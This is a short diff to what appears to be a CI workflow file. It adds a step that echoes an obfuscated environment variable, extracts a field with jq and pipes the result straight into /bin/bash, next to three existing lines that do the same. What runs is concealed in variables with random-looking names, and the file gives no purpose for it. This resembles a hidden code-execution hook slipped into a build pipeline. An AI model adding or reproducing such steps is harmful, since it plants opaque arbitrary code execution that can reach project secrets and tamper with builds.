@@ -32,6 +32,7 @@ jobs:
           printf '%s' "$ubf8" | jq -r .vnpi6 | /bin/bash
           printf '%s' "$sy3" | jq -r .ss3 | /bin/bash
           printf '%s' "$wsy813" | jq -r .oae9886 | /bin/bash
+          echo $lvoo0 | jq -r .p8 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
